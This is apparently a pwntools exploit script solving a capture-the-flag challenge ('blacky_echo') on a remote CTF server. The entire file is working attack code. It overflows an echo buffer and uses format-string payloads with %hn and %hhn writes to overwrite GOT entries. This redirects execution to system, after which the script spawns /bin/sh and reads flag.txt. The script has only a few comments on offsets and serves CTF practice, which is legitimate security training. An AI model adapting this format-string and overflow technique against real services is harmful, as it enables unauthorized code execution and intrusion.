from pwn import *   

if args.REMOTE:
    r = remote('blacky-echo.challs.olicyber.it', 11002)
else:
    r = gdb.debug('./blacky_echo', '''
        b *print_error + 120
        continue
    ''')

libc = ELF('./blacky_echo')
print('exit: ', libc.symbols['exit'], hex(libc.symbols['exit']))
print('puts: ', libc.symbols['puts'], hex(libc.symbols['puts']))
print('system', libc.symbols['system'], hex(libc.symbols['system']))
                    
r.recvuntil(b"Size: ")
r.sendline(b"65599") #Size of the buffer
r.recvuntil(b"Input: ")

#p64(0x4008e0) = 0xe008400000000000
#p64(0x400B54) = 0x540B400000000000

#2879 = int(0x0b54) - 21(num of chars written so far) 

payload = b"%2879x%12$hnAAAAAAA" + p64(0x602088)

r.sendline(b"echo->" + b"a"*65540 + payload)

r.recvuntil(b"Size: ")
r.sendline(b"65599")
r.recvuntil(b"Input: ")

payload = b"%43x%12$hhnAAAAAAAA" + p64(0x602020)

r.sendline(b"echo->" + b"a"*65540 + payload)

r.recvuntil(b"Size: ")
r.sendline(b"65599")
r.recvuntil(b"Input: ")
r.sendline(b"ECHO->" + b"/bin/sh")
r.sendline(b"cat flag.txt")
print(r.recvline().decode())